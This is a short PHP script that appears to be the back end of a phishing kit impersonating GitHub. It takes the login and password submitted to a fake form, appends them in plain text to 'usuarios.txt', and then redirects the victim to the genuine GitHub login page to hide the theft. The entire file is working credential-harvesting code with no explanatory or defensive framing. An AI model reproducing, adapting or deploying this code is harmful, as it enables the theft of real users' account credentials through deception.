<?php
include 'ip.php';

file_put_contents("usuarios.txt", "User: " . $_POST['login'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://github.com/login');
exit();